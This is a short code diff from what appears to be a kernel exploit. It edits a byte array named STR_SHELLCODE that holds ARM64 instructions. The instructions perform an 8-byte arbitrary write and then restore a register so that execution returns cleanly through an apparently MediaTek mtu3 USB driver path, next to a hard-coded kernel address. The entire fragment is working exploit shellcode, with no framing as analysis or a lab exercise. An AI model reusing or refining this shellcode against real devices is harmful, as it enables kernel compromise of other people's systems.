@@ -59,7 +59,7 @@ constexpr uint64_t BSS_DATA = 0xFFFFFFC000670B00;
 
 const std::vector<uint8_t> STR_SHELLCODE = {
     0x93, 0x02, 0x00, 0xF9,  // STR X19, [X20]         ; our 8-byte write
-    0xF4, 0x03, 0x15, 0xAA,  // MOV X20, X21           ; redirect for mtu3_req_complete STRB
+    0xB4, 0x3E, 0x40, 0xF9,  // LDR X20, [X21, #0x78]  ; restore X20 to mep (ep0)
     0x60, 0x5A, 0xFE, 0x17,  // B CLEAN_RETURN
 };
 
